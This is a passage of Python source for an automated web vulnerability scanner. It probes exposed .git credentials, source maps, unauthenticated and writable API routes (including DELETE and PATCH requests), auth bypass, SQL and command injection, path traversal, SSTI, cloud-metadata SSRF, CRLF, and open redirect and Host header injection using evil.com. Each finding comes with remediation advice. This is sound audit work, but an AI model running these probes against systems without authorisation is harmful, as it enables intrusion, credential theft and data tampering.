            for line in resp.text.splitlines():
                line = line.strip()
                if line.lower().startswith("disallow:"):
                    path = line.split(":", 1)[1].strip()
                    if path and path != "/" and path not in extra_paths:
                        extra_paths.append(path)
                elif line.lower().startswith("sitemap:"):
                    sitemap_url = line.split(":", 1)[1].strip()
                    if sitemap_url.startswith("http"):
                        extra_paths.append(urlparse(sitemap_url).path)
            log.info(f"robots.txt: {len(extra_paths)} additional paths")

    # Parse sitemap.xml
    sitemap_found = [fp for fp in found_paths if "sitemap" in fp["path"] and fp["status"] == 200]
    if sitemap_found:
        resp = safe_request(session, "GET", urljoin(target, "/sitemap.xml"))
        if resp and resp.status_code == 200:
            try:
                root = ET.fromstring(resp.content)
                ns = {"sm": "http://www.sitemaps.org/schemas/sitemap/0.9"}
                for loc in root.findall(".//sm:loc", ns) + root.findall(".//loc"):
                    url = loc.text
                    if url:
                        path = urlparse(url).path
                        if "/api/" in path and path not in extra_api_routes:
                            extra_api_routes.append(path)
                        elif path not in extra_paths:
                            extra_paths.append(path)
                log.info(f"sitemap.xml: {len(extra_api_routes)} API routes, "
                         f"{len(extra_paths)} paths")
            except ET.ParseError:
                log.warn("Could not parse sitemap.xml")

    return extra_paths, extra_api_routes


def discover_source_maps(session, target, js_urls):
    """Check if source map files exist for discovered JS bundles."""
    log.section("Source Map Discovery")
    findings = []

    for js_url in js_urls:
        map_url = js_url + ".map"
        resp = safe_request(session, "GET", map_url)
        if resp and resp.status_code == 200 and len(resp.content) > 50:
            # Verify it looks like a source map
            if '"sources"' in resp.text[:500] or '"mappings"' in resp.text[:500]:
                log.finding("HIGH", f"Source map exposed: {map_url}")
                # Check for sensitive paths in sources
                sensitive = []
                try:
                    sm = resp.json()
                    for src in sm.get("sources", [])[:20]:
                        if any(x in src.lower() for x in [".env", "config", "secret", "key", "password"]):
                            sensitive.append(src)
                except (json.JSONDecodeError, ValueError):
                    pass
                findings.append({
                    "title": f"Source Map Exposed: {urlparse(map_url).path}",
                    "severity": "HIGH",
                    "detail": ("Source map file is publicly accessible, exposing full original source code. "
                               + (f"Sensitive files found: {', '.join(sensitive)}" if sensitive else "")),
                    "evidence": f"URL: {map_url} ({len(resp.content)} bytes)",
                    "remediation": (
                        "Remove .map files from production deployments. "
                        "Configure your build tool to disable source map generation for production, "
                        "or restrict access via server config (deny *.map files)."
                    ),
                })

    if not findings:
        log.ok("No exposed source maps found")
    return findings


def probe_git_exposure(session, target, found_paths):
    """Check for exposed .git repository data."""
    log.section("Git Repository Exposure Check")
    findings = []

    git_found = any(fp["path"] in ("/.git/HEAD", "/.git/config") and fp["status"] == 200
                    for fp in found_paths)
    if not git_found:
        # Quick check if not in found_paths
        resp = safe_request(session, "GET", urljoin(target, "/.git/HEAD"))
        if resp and resp.status_code == 200 and "ref:" in resp.text:
            git_found = True

    if not git_found:
        log.ok("No .git exposure detected")
        return findings

    log.finding("HIGH", ".git directory is accessible!")
    evidence_parts = []

    # Probe specific files
    git_files = {
        "/.git/config": "Repository configuration (may contain credentials)",
        "/.git/logs/HEAD": "Commit history with author emails",
        "/.git/packed-refs": "Branch and tag references",
        "/.git/FETCH_HEAD": "Remote fetch history",
    }

    for path, desc in git_files.items():
        resp = safe_request(session, "GET", urljoin(target, path))
        if resp and resp.status_code == 200 and len(resp.content) > 5:
            evidence_parts.append(f"{path}: {resp.text[:200]}")

            # Check config for embedded credentials
            if path == "/.git/config":
                cred_match = re.search(r'https?://([^@]+)@', resp.text)
                if cred_match:
                    log.finding("CRITICAL", f"Credentials in .git/config: {cred_match.group(1)}")
                    findings.append({
                        "title": "Credentials Exposed in .git/config",
                        "severity": "CRITICAL",
                        "detail": "The .git/config file contains embedded credentials in remote URLs.",
                        "evidence": resp.text[:500],
                        "remediation": "Rotate the exposed credentials immediately. Block access to /.git/ via server config.",
                    })

    findings.append({
        "title": "Git Repository Exposed",
        "severity": "HIGH",
        "detail": "The .git directory is publicly accessible, potentially exposing full source code and commit history.",
        "evidence": "\n".join(evidence_parts)[:800],
        "remediation": "Block access to /.git/ in your web server config. For Nginx: location ~ /\\.git { deny all; }",
    })

    return findings


# ---------------------------------------------------------------------------
# Phase 3: API Testing
# ---------------------------------------------------------------------------

def test_single_route(session, target, route, baseline_hash):
    """Test a single API route for auth/write issues. Returns dict of results."""
    result = {"accessible": [], "writable": [], "data": []}
    url = urljoin(target, route)

    # GET test
    resp = safe_request(session, "GET", url, headers={"Accept": "application/json"})
    if resp is None or is_same_content(resp, baseline_hash):
        pass
    else:
        content_type = resp.headers.get("Content-Type", "")
        is_json = "json" in content_type or resp.text.strip().startswith(("{", "["))
        if resp.status_code == 200 and is_json and len(resp.content) > 2:
            try:
                data = resp.json()
                record_count = len(data) if isinstance(data, list) else None
                sample = json.dumps(data)[:300] if data else ""
                pii_fields = ["phone", "email", "address", "name", "password",
                              "ssn", "dob", "birth", "credit", "card"]
                has_pii = any(f in sample.lower() for f in pii_fields)
                result["accessible"].append({
                    "route": route, "method": "GET", "status": resp.status_code,
                    "record_count": record_count, "has_pii": has_pii,
                    "sample": sample, "size": len(resp.content),
                })
                result["data"].append({"route": route, "data": data})
            except (json.JSONDecodeError, ValueError):
                pass
        elif resp.status_code == 200 and len(resp.content) > 2:
            result["accessible"].append({
                "route": route, "method": "GET", "status": resp.status_code,
                "record_count": None, "has_pii": False,
                "sample": resp.text[:200], "size": len(resp.content),
            })

    # POST test
    resp_post = safe_request(session, "POST", url,
                             headers={"Content-Type": "application/json"}, json={})
    if resp_post and not is_same_content(resp_post, baseline_hash):
        if resp_post.status_code not in (404, 405, 401, 403):
            result["writable"].append({
                "route": route, "method": "POST", "status": resp_post.status_code,
                "response": resp_post.text[:300],
            })

    # DELETE test (fake ID)
    del_url = url.rstrip("/") + "/999999"
    resp_del = safe_request(session, "DELETE", del_url)
    if resp_del and not is_same_content(resp_del, baseline_hash):
        if resp_del.status_code not in (404, 405, 401, 403):
            result["writable"].append({
                "route": route + "/:id", "method": "DELETE",
                "status": resp_del.status_code, "response": resp_del.text[:300],
            })

    # PATCH test (fake ID)
    patch_url = url.rstrip("/") + "/1"
    resp_patch = safe_request(session, "PATCH", patch_url,
                              headers={"Content-Type": "application/json"}, json={})
    if resp_patch and not is_same_content(resp_patch, baseline_hash):
        if resp_patch.status_code not in (404, 405, 401, 403):
            result["writable"].append({
                "route": route + "/:id", "method": "PATCH",
                "status": resp_patch.status_code, "response": resp_patch.text[:300],
            })

    return result


def test_api_endpoints(session, target, api_routes, baseline_hash):
    """Test each discovered API route for unauthenticated access (parallelized)."""
    log.section("API Authentication & Authorization Testing")
    findings = []
    accessible_endpoints = []
    writable_endpoints = []
    data_endpoints = []
    counter = [0]
    lock = threading.Lock()

    unique_routes = sorted(set(api_routes))

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {
            executor.submit(test_single_route, session, target, route, baseline_hash): route
            for route in unique_routes
        }
        for future in as_completed(futures):
            result = future.result()
            with lock:
                counter[0] += 1
                log.progress(counter[0], len(unique_routes), "Testing APIs")
                accessible_endpoints.extend(result["accessible"])
                writable_endpoints.extend(result["writable"])
                data_endpoints.extend(result["data"])
                for ep in result["accessible"]:
                    sev = "CRITICAL" if ep["has_pii"] else "HIGH"
                    log.finding(sev, f"GET {ep['route']} -> {ep['status']}"
                                + (f" ({ep['record_count']} records)" if ep["record_count"] else "")
                                + (" [PII]" if ep["has_pii"] else ""))
                for ep in result["writable"]:
                    log.finding("CRITICAL",
                                f"{ep['method']} {ep['route']} -> {ep['status']} (no auth)")

    if not accessible_endpoints:
        log.ok("No unauthenticated API endpoints found")

    # Build findings
    if accessible_endpoints:
        pii_endpoints = [e for e in accessible_endpoints if e["has_pii"]]
        findings.append({
            "title": "Unauthenticated API Access",
            "severity": "CRITICAL" if pii_endpoints else "HIGH",
            "detail": (f"{len(accessible_endpoints)} API endpoints accessible without authentication. "
                       + (f"{len(pii_endpoints)} contain PII." if pii_endpoints else "")),
            "evidence": "\n".join(
                f"GET {e['route']} -> {e['status']}"
                + (f" ({e['record_count']} records)" if e['record_count'] else "")
                for e in accessible_endpoints
            ),
            "endpoints": accessible_endpoints,
            "remediation": (
                "Add authentication middleware to all non-public API routes. "
                "Return HTTP 401 for unauthenticated requests and 403 for unauthorized ones. "
                "For Express.js: apply an auth middleware before route handlers."
            ),
        })

    if writable_endpoints:
        findings.append({
            "title": "Unauthenticated Write Operations",
            "severity": "CRITICAL",
            "detail": (f"{len(writable_endpoints)} write endpoints (POST/PUT/PATCH/DELETE) "
                       f"accept requests without authentication."),
            "evidence": "\n".join(
                f"{e['method']} {e['route']} -> {e['status']}: {e['response'][:100]}"
                for e in writable_endpoints
            ),
            "writable": writable_endpoints,
            "remediation": (
                "Require authentication and CSRF tokens for all mutating endpoints. "
                "Validate authorization server-side on every request — never trust client-side controls."
            ),
        })

    return findings, accessible_endpoints, writable_endpoints, data_endpoints


def test_auth_bypass(session, target, api_routes):
    """Test auth endpoints for bypass vulnerabilities."""
    log.section("Authentication Bypass Testing")
    findings = []

    auth_keywords = ["auth", "login", "verify", "signin", "token", "session"]
    auth_routes = [r for r in api_routes if any(k in r.lower() for k in auth_keywords)]

    if not auth_routes:
        log.info("No auth endpoints found to test")
        return findings

    for route in auth_routes:
        url = urljoin(target, route)
        log.info(f"Testing: {route}")

        for name, payload in AUTH_BYPASS_PAYLOADS:
            resp = safe_request(session, "POST", url,
                                headers={"Content-Type": "application/json"},
                                json=payload)
            if resp is None:
                continue
            try:
                body = resp.json()
            except (json.JSONDecodeError, ValueError):
                body = resp.text

            # Check if bypass succeeded
            success_indicators = ["success", "token", "jwt", "session", "authenticated"]
            resp_str = json.dumps(body).lower() if isinstance(body, dict) else str(body).lower()
            if any(f'"{ind}":true' in resp_str or f'"{ind}": true' in resp_str
                   for ind in success_indicators):
                log.finding("CRITICAL", f"AUTH BYPASS on {route} with {name}!")
                findings.append({
                    "title": f"Authentication Bypass via {name}",
                    "severity": "CRITICAL",
                    "detail": f"The auth endpoint {route} can be bypassed using {name} payload.",
                    "evidence": f"Payload: {json.dumps(payload)}\nResponse: {resp_str[:300]}",
                    "remediation": (
                        "Enforce strict server-side type checking on all auth input fields. "
                        "Reject any credential that is not a non-empty string. "
                        "For NoSQL databases, use parameterized queries or ODM-level sanitization."
                    ),
                })
            else:
                # Check for info disclosure in error messages
                if isinstance(body, dict):
                    msg = body.get("message", "") or body.get("error", "")
                    if any(x in msg.lower() for x in ["sql", "syntax", "stack", "trace", "internal"]):
                        log.finding("MEDIUM", f"Verbose error on {route}: {msg[:80]}")
                        findings.append({
                            "title": f"Verbose Error Disclosure on {route}",
                            "severity": "MEDIUM",
                            "detail": (
                                f"The endpoint {route} returns verbose error messages that may "
                                "reveal internal implementation details to attackers."
                            ),
                            "evidence": f"Error message: {msg[:300]}",
                            "remediation": (
                                "Return only generic error messages to clients (e.g. 'Invalid credentials'). "
                                "Log detailed errors server-side only, never in API responses."
                            ),
                        })

    if not findings:
        log.ok("No auth bypass found")

    return findings


# ---------------------------------------------------------------------------
# Phase 4: Additional checks
# ---------------------------------------------------------------------------

def check_rate_limiting(session, target):
    """Quick check for rate limiting on the target."""
    log.section("Rate Limiting Check")
    findings = []

    rapid_count = 20
    url = target
    start = time.time()
    blocked = False

    for i in range(rapid_count):
        resp = requests.get(url, headers={"User-Agent": USER_AGENT}, timeout=REQUEST_TIMEOUT)
        if resp.status_code == 429:
            blocked = True
            log.ok(f"Rate limiting active (429 after {i + 1} requests)")
            break

    elapsed = time.time() - start

    if not blocked:
        log.finding("MEDIUM", f"{rapid_count} rapid requests in {elapsed:.1f}s - no rate limiting detected")
        findings.append({
            "title": "No Rate Limiting Detected",
            "severity": "MEDIUM",
            "detail": f"{rapid_count} rapid requests completed in {elapsed:.1f}s with no throttling.",
            "evidence": f"All {rapid_count} requests returned successfully",
            "remediation": (
                "Implement rate limiting on all endpoints, especially auth and sensitive routes. "
                "For Express.js: use express-rate-limit. For Nginx: use limit_req_zone. "
                "Return HTTP 429 with a Retry-After header when limits are exceeded."
            ),
        })

    return findings


def check_upload_endpoints(session, target, api_routes):
    """Check for open upload/file-write endpoints."""
    log.section("Upload Endpoint Testing")
    findings = []

    upload_keywords = ["upload", "file", "image", "media", "attachment", "request-url"]
    upload_routes = [r for r in api_routes if any(k in r.lower() for k in upload_keywords)]

    for route in upload_routes:
        url = urljoin(target, route)
        # Test with a small benign payload
        resp = safe_request(session, "POST", url,
                            headers={"Content-Type": "application/json"},
                            json={"name": "audit-test.txt", "size": 10, "contentType": "text/plain"})
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                resp_str = json.dumps(data)
                if any(x in resp_str.lower() for x in ["url", "upload", "presigned", "s3", "blob"]):
                    log.finding("CRITICAL", f"Unauthenticated upload URL generation: {route}")

                    # Extract any AWS/cloud credentials from the URL
                    cred_match = re.search(r'Credential=([^/&]+)', resp_str)
                    cred_info = f"\nExposed credential: {cred_match.group(1)}" if cred_match else ""

                    findings.append({
                        "title": "Unauthenticated File Upload",
                        "severity": "CRITICAL",
                        "detail": (f"The endpoint {route} generates upload URLs without authentication. "
                                   f"Attackers can upload arbitrary files." + cred_info),
                        "evidence": resp_str[:500],
                        "remediation": (
                            "Require authentication before generating presigned upload URLs. "
                            "Validate file type, size, and content server-side after upload. "
                            "If cloud credentials were exposed, rotate them immediately."
                        ),
                    })
            except (json.JSONDecodeError, ValueError):
                pass

    if not findings:
        log.ok("No open upload endpoints found")

    return findings


# ---------------------------------------------------------------------------
# Phase 3A: Injection Testing
# ---------------------------------------------------------------------------

def _extract_injectable_params(session, target, api_routes, baseline_hash):
    """Identify injectable parameters from discovered routes."""
    params = []
    common_params = ["q", "id", "search", "file", "path", "url", "name",
                     "page", "query", "s", "keyword", "input", "data",
                     "redirect", "return", "next", "callback", "ref"]

    for route in api_routes[:30]:  # Cap to avoid excessive requests
        url = urljoin(target, route)
        # Try each common param
        for p in common_params:
            test_url = f"{url}?{p}=testvalue123"
            resp = safe_request(session, "GET", test_url)
            if resp and resp.status_code != 404 and not is_same_content(resp, baseline_hash):
                params.append({"url": url, "param": p, "method": "GET"})
                break  # One param per route is enough for testing

    log.info(f"Identified {len(params)} injectable parameter targets")
    return params


def test_sqli(session, target, injectable_params):
    """Test for SQL injection vulnerabilities."""
    log.section("SQL Injection Testing")
    findings = []
    tested = set()

    for ip in injectable_params:
        url, param = ip["url"], ip["param"]
        key = f"{url}:{param}"
        if key in tested:
            continue
        tested.add(key)

        for payload in SQLI_PAYLOADS:
            resp = safe_request(session, "GET", url, params={param: payload})
            if resp is None:
                continue

            body_lower = resp.text.lower()

            # Error-based detection
            for sig in SQLI_ERROR_SIGNATURES:
                if sig in body_lower:
                    log.finding("CRITICAL", f"SQLi on {ip['param']}@{urlparse(url).path}: {sig}")
                    findings.append({
                        "title": f"SQL Injection ({param} parameter)",
                        "severity": "CRITICAL",
                        "detail": f"SQL error signature detected when injecting into parameter '{param}' at {urlparse(url).path}.",
                        "evidence": f"Payload: {payload}\nSignature: {sig}\nResponse excerpt: {resp.text[:300]}",
                        "remediation": "Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
                    })
                    return findings  # One confirmed SQLi is enough

            # Time-based blind (only for SLEEP/WAITFOR payloads)
            if "SLEEP" in payload or "WAITFOR" in payload:
                start = time.time()
                resp2 = safe_request(session, "GET", url, params={param: payload},
                                     timeout=20)
                elapsed = time.time() - start
                if elapsed > 4.5:
                    log.finding("HIGH", f"Time-based blind SQLi possible on {param}@{urlparse(url).path}")
                    findings.append({
                        "title": f"Potential Blind SQL Injection ({param})",
                        "severity": "HIGH",
                        "detail": f"Significant delay ({elapsed:.1f}s) observed with time-based payload on '{param}'.",
                        "evidence": f"Payload: {payload}\nResponse time: {elapsed:.1f}s (baseline <1s)",
                        "remediation": "Use parameterized queries. Investigate why the application processes delay-inducing SQL payloads.",
                    })

    if not findings:
        log.ok("No SQL injection vulnerabilities detected")
    return findings


def test_reflected_xss(session, target, injectable_params):
    """Test for reflected XSS vulnerabilities."""
    log.section("Reflected XSS Testing")
    findings = []
    tested = set()

    for ip in injectable_params:
        url, param = ip["url"], ip["param"]
        key = f"{url}:{param}"
        if key in tested:
            continue
        tested.add(key)

        for payload in XSS_PAYLOADS:
            resp = safe_request(session, "GET", url, params={param: payload})
            if resp is None:
                continue
            # Check if payload is reflected unescaped
            if payload in resp.text:
                content_type = resp.headers.get("Content-Type", "")
                if "html" in content_type or "text" in content_type:
                    log.finding("HIGH", f"Reflected XSS on {param}@{urlparse(url).path}")
                    findings.append({
                        "title": f"Reflected XSS ({param} parameter)",
                        "severity": "HIGH",
                        "detail": f"XSS payload reflected unescaped in response from {urlparse(url).path}.",
                        "evidence": f"Payload: {payload}\nReflected in response body (Content-Type: {content_type})",
                        "remediation": "HTML-encode all user input before rendering. Use Content-Security-Policy to prevent inline script execution.",
                    })
                    return findings

    if not findings:
        log.ok("No reflected XSS vulnerabilities detected")
    return findings


def test_command_injection(session, target, injectable_params):
    """Test for OS command injection."""
    log.section("Command Injection Testing")
    findings = []
    cmd_param_names = {"file", "path", "dir", "cmd", "exec", "command",
                       "name", "filename", "template", "input"}

    for ip in injectable_params:
        url, param = ip["url"], ip["param"]
        if param.lower() not in cmd_param_names:
            continue

        for payload in CMDI_PAYLOADS:
            resp = safe_request(session, "GET", url, params={param: payload})
            if resp is None:
                continue
            body = resp.text
            for sig in CMDI_SIGNATURES:
                if sig in body:
                    log.finding("CRITICAL", f"Command injection on {param}@{urlparse(url).path}")
                    findings.append({
                        "title": f"OS Command Injection ({param} parameter)",
                        "severity": "CRITICAL",
                        "detail": f"Command output signature '{sig}' found when injecting into '{param}'.",
                        "evidence": f"Payload: {payload}\nSignature: {sig}\nResponse: {body[:300]}",
                        "remediation": "Never pass user input to shell commands. Use language-native APIs instead of shell execution.",
                    })
                    return findings

    if not findings:
        log.ok("No command injection vulnerabilities detected")
    return findings


def test_path_traversal(session, target, injectable_params):
    """Test for path traversal / LFI vulnerabilities."""
    log.section("Path Traversal / LFI Testing")
    findings = []
    path_params = {"file", "path", "template", "page", "doc", "folder",
                   "dir", "include", "load", "read", "view"}

    for ip in injectable_params:
        url, param = ip["url"], ip["param"]
        if param.lower() not in path_params:
            continue

        for payload in PATH_TRAVERSAL_PAYLOADS:
            resp = safe_request(session, "GET", url, params={param: payload})
            if resp is None:
                continue
            for sig in PATH_TRAVERSAL_SIGS:
                if sig in resp.text:
                    log.finding("HIGH", f"Path traversal on {param}@{urlparse(url).path}")
                    findings.append({
                        "title": f"Path Traversal / LFI ({param} parameter)",
                        "severity": "HIGH",
                        "detail": f"Local file content detected when injecting traversal payload into '{param}'.",
                        "evidence": f"Payload: {payload}\nSignature: {sig}\nResponse: {resp.text[:300]}",
                        "remediation": "Validate and sanitize file paths. Use a whitelist of allowed files. Never use user input in file system operations directly.",
                    })
                    return findings

    if not findings:
        log.ok("No path traversal vulnerabilities detected")
    return findings


def test_ssti(session, target, injectable_params):
    """Test for Server-Side Template Injection."""
    log.section("SSTI Testing")
    findings = []

    for ip in injectable_params:
        url, param = ip["url"], ip["param"]
        for payload, expected in SSTI_PAYLOADS:
            resp = safe_request(session, "GET", url, params={param: payload})
            if resp is None:
                continue
            if expected in resp.text and payload not in resp.text:
                log.finding("HIGH", f"SSTI on {param}@{urlparse(url).path} with {payload}")
                findings.append({
                    "title": f"Server-Side Template Injection ({param})",
                    "severity": "HIGH",
                    "detail": f"Template expression '{payload}' was evaluated to '{expected}' on the server.",
                    "evidence": f"Payload: {payload}\nExpected: {expected}\nFound in response body",
                    "remediation": "Never pass user input into template rendering contexts. Use sandboxed template engines and escape all inputs.",
                })
                return findings

    if not findings:
        log.ok("No SSTI vulnerabilities detected")
    return findings


def test_ssrf(session, target, injectable_params):
    """Test for Server-Side Request Forgery."""
    log.section("SSRF Testing")
    findings = []
    url_params = {"url", "link", "href", "src", "dest", "redirect", "fetch",
                  "proxy", "callback", "uri", "endpoint", "target", "site"}

    for ip in injectable_params:
        url, param = ip["url"], ip["param"]
        if param.lower() not in url_params:
            continue

        for ssrf_target in SSRF_TARGETS:
            resp = safe_request(session, "GET", url, params={param: ssrf_target})
            if resp is None:
                continue
            body = resp.text.lower()
            ssrf_indicators = ["ami-id", "instance-id", "iam", "accesskeyid",
                               "secretaccesskey", "meta-data", "security-credentials"]
            if any(ind in body for ind in ssrf_indicators):
                log.finding("CRITICAL", f"SSRF on {param}@{urlparse(url).path}")
                findings.append({
                    "title": f"Server-Side Request Forgery ({param})",
                    "severity": "CRITICAL",
                    "detail": f"Cloud metadata content returned when injecting internal URL into '{param}'.",
                    "evidence": f"Payload: {ssrf_target}\nResponse contains cloud metadata indicators",
                    "remediation": "Validate and whitelist URLs. Block requests to internal/metadata IPs (169.254.x.x, 127.x.x.x, 10.x.x.x). Use a URL parser to reject private addresses.",
                })
                return findings

    if not findings:
        log.ok("No SSRF vulnerabilities detected")
    return findings


def test_crlf_injection(session, target, injectable_params):
    """Test for CRLF injection (HTTP header injection)."""
    log.section("CRLF Injection Testing")
    findings = []

    for ip in injectable_params[:15]:
        url, param = ip["url"], ip["param"]
        payload = "testvalue%0d%0aX-Injected:%20true"
        resp = safe_request(session, "GET", url, params={param: payload},
                            allow_redirects=False)
        if resp is None:
            continue
        if "x-injected" in {k.lower() for k in resp.headers}:
            log.finding("MEDIUM", f"CRLF injection on {param}@{urlparse(url).path}")
            findings.append({
                "title": f"CRLF Injection ({param} parameter)",
                "severity": "MEDIUM",
                "detail": f"Injected header appeared in response when CRLF was injected into '{param}'.",
                "evidence": f"Payload: {payload}\nInjected header 'X-Injected' found in response headers",
                "remediation": "Strip or reject CR (\\r) and LF (\\n) characters from all user input used in HTTP headers.",
            })
            return findings

    if not findings:
        log.ok("No CRLF injection vulnerabilities detected")
    return findings


def test_open_redirect(session, target, api_routes, found_paths):
    """Test for open redirect vulnerabilities."""
    log.section("Open Redirect Testing")
    findings = []

    # Test against routes that could handle redirects
    test_urls = [urljoin(target, r) for r in api_routes[:20]]
    test_urls.append(target)

    for url in test_urls:
        for param_name in REDIRECT_PARAM_NAMES[:8]:
            for payload in OPEN_REDIRECT_PAYLOADS[:4]:
                resp = safe_request(session, "GET", url, params={param_name: payload},
                                    allow_redirects=False)
                if resp is None:
                    continue
                location = resp.headers.get("Location", "")
                if "evil.com" in location:
                    log.finding("MEDIUM", f"Open redirect via {param_name}@{urlparse(url).path}")
                    findings.append({
                        "title": f"Open Redirect ({param_name} parameter)",
                        "severity": "MEDIUM",
                        "detail": f"The server redirects to an attacker-controlled URL when '{param_name}' is set.",
                        "evidence": f"Payload: ?{param_name}={payload}\nLocation: {location}",
                        "remediation": "Validate redirect targets against a whitelist of allowed domains. Use relative paths for internal redirects.",
                    })
                    return findings

    if not findings:
        log.ok("No open redirect vulnerabilities detected")
    return findings


def test_host_header_injection(session, target):
    """Test for Host header injection."""
    log.section("Host Header Injection Testing")
    findings = []

    parsed = urlparse(target)
    test_headers_list = [
        {"Host": "evil.com"},
        {"X-Forwarded-Host": "evil.com"},
        {"X-Host": "evil.com"},
    ]

    for extra_headers in test_headers_list:
        resp = safe_request(session, "GET", target, headers=extra_headers,
                            allow_redirects=False)
        if resp is None:
            continue

        header_name = list(extra_headers.keys())[0]
        # Check if evil.com appears in response
        if "evil.com" in resp.text or "evil.com" in resp.headers.get("Location", ""):
            log.finding("HIGH", f"Host header injection via {header_name}")
            findings.append({
                "title": f"Host Header Injection via {header_name}",
                "severity": "HIGH",
                "detail": f"The server reflects the injected host '{header_name}: evil.com' in its response.",
                "evidence": f"Header: {header_name}: evil.com\n"
                            f"Location: {resp.headers.get('Location', 'N/A')}\n"
                            f"Body contains evil.com: {'evil.com' in resp.text}",
                "remediation": "Ignore X-Forwarded-Host from untrusted sources. Hardcode the server's hostname in password reset URLs and redirects.",
            })
            return findings

    if not findings:
        log.ok("No host header injection detected")
    return findings


def run_injection_tests(session, target, api_routes, found_paths, baseline_hash):
    """Orchestrate all injection testing."""
    log.banner("Phase 3A: Injection Testing")
    all_findings = []

    # Extract injectable parameters first
    injectable_params = _extract_injectable_params(session, target, api_routes, baseline_hash)

    # Run injection tests in parallel groups
    test_funcs = [
        ("SQLi", lambda: test_sqli(session, target, injectable_params)),
        ("XSS", lambda: test_reflected_xss(session, target, injectable_params)),
        ("CMDI", lambda: test_command_injection(session, target, injectable_params)),
        ("LFI", lambda: test_path_traversal(session, target, injectable_params)),
        ("SSTI", lambda: test_ssti(session, target, injectable_params)),
        ("SSRF", lambda: test_ssrf(session, target, injectable_params)),
        ("CRLF", lambda: test_crlf_injection(session, target, injectable_params)),
    ]

    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = {executor.submit(fn): name for name, fn in test_funcs}
        for future in as_completed(futures):
            result = future.result()
            all_findings.extend(result)

    # These don't use injectable_params — run separately
    all_findings.extend(test_open_redirect(session, target, api_routes, found_paths))
    all_findings.extend(test_host_header_injection(session, target))

    return all_findings


# ---------------------------------------------------------------------------
# Phase 3B: Extended API Testing
# ---------------------------------------------------------------------------

def test_graphql_introspection(session, target, found_paths):
    """Test GraphQL endpoints for introspection and unauth access."""
    log.section("GraphQL Introspection Testing")
    findings = []

    graphql_paths = ["/graphql", "/graphiql", "/_graphql", "/api/graphql"]
    found_gql = [fp["path"] for fp in found_paths
                 if any(g in fp["path"] for g in ["graphql", "graphiql"])]
    candidates = list(set(graphql_paths + found_gql))

    for path in candidates:
        url = urljoin(target, path)
        resp = safe_request(session, "POST", url,
                            headers={"Content-Type": "application/json"},
                            data=GRAPHQL_INTROSPECTION_QUERY)
        if resp is None or resp.status_code != 200:
            continue

        try:
            data = resp.json()
        except (json.JSONDecodeError, ValueError):
            continue

        schema = data.get("data", {}).get("__schema")
        if not schema:
            continue

        types = schema.get("types", [])
        type_names = [t["name"] for t in types if not t["name"].startswith("__")]
        mutations = schema.get("mutationType", {})
        mutation_names = [f["name"] for f in (mutations.get("fields") or [])] if mutations else []

        sensitive_types = [t for t in type_names
                          if any(s in t.lower() for s in ["user", "admin", "password",
                                                          "token", "secret", "auth", "credential"])]

        log.finding("HIGH", f"GraphQL introspection enabled at {path}")
        findings.append({
            "title": f"GraphQL Introspection Enabled ({path})",
            "severity": "HIGH",
            "detail": (f"GraphQL introspection is enabled, exposing {len(type_names)} types "
                       f"and {len(mutation_names)} mutations. "
                       + (f"Sensitive types found: {', '.join(sensitive_types)}" if sensitive_types else "")),
            "evidence": (f"Types: {', '.join(type_names[:20])}\n"
                         f"Mutations: {', '.join(mutation_names[:15])}\n"
                         f"Sensitive: {', '.join(sensitive_types)}"),
            "remediation": "Disable GraphQL introspection in production. Implement authentication on all queries and mutations.",
        })
        break

    if not findings:
        log.ok("No GraphQL introspection exposure found")
    return findings


def _decode_jwt_part(part):
    """Base64url decode a JWT segment. Returns parsed dict or None."""
    try:
        padding = 4 - len(part) % 4
        part += "=" * padding
        decoded = base64.urlsafe_b64decode(part)
        return json.loads(decoded)
    except Exception:
        return None


def analyze_jwt_tokens(session, target, api_routes, resp_headers):
    """Analyze JWT tokens found in responses for security issues."""
    log.section("JWT Token Analysis")
    findings = []
    jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
    tokens_found = set()

    # Collect JWTs from cookies
    cookie_str = resp_headers.get("Set-Cookie", "")
    for match in jwt_pattern.findall(cookie_str):
        tokens_found.add(match)

    # Collect from auth endpoint responses
    auth_keywords = ["auth", "login", "token", "signin", "session"]
    auth_routes = [r for r in api_routes if any(k in r.lower() for k in auth_keywords)]
    for route in auth_routes[:5]:
        url = urljoin(target, route)
        resp = safe_request(session, "GET", url, headers={"Accept": "application/json"})
        if resp and resp.status_code == 200:
            for match in jwt_pattern.findall(resp.text):
                tokens_found.add(match)

    if not tokens_found:
        log.ok("No JWT tokens found to analyze")
        return findings

    log.info(f"Found {len(tokens_found)} JWT token(s) to analyze")

    for token in list(tokens_found)[:5]:
        parts = token.split(".")
        if len(parts) != 3:
            continue

        header = _decode_jwt_part(parts[0])
        payload = _decode_jwt_part(parts[1])
        if not header or not payload:
            continue

        alg = header.get("alg", "unknown")

        # Check algorithm
        if alg.lower() == "none":
            log.finding("CRITICAL", f"JWT with alg=none (unsigned token!)")
            findings.append({
                "title": "JWT Algorithm None (Unsigned Token)",
                "severity": "CRITICAL",
                "detail": "A JWT with algorithm 'none' was found — this token has no signature verification.",
                "evidence": f"Header: {json.dumps(header)}\nPayload keys: {list(payload.keys())}",
                "remediation": "Reject tokens with alg=none. Always verify JWT signatures server-side with a strong algorithm (RS256 or ES256).",
            })
        elif alg.upper() == "HS256":
            log.finding("MEDIUM", f"JWT using HS256 (symmetric key)")
            findings.append({
                "title": "JWT Using HS256 (Symmetric Algorithm)",
                "severity": "MEDIUM",
                "detail": "JWT uses HS256 symmetric signing. If the secret is weak or shared, tokens can be forged.",
                "evidence": f"Algorithm: {alg}",
                "remediation": "Consider using RS256 (asymmetric) for public-facing APIs. If using HS256, ensure the secret is at least 256 bits of entropy.",
            })

        # Check expiration
        exp = payload.get("exp")
        if exp is None:
            log.finding("HIGH", "JWT missing expiration claim")
            findings.append({
                "title": "JWT Missing Expiration (exp) Claim",
                "severity": "HIGH",
                "detail": "A JWT was found without an expiration claim — the token never expires.",
                "evidence": f"Payload: {json.dumps({k: v for k, v in payload.items() if k != 'password'}, default=str)[:300]}",
                "remediation": "Always include an 'exp' claim. Set token lifetime to the shortest acceptable duration (e.g. 15 minutes for access tokens).",
            })

        # Check for sensitive data in payload
        sensitive_found = [k for k in payload if k.lower() in JWT_SENSITIVE_CLAIMS]
        if sensitive_found:
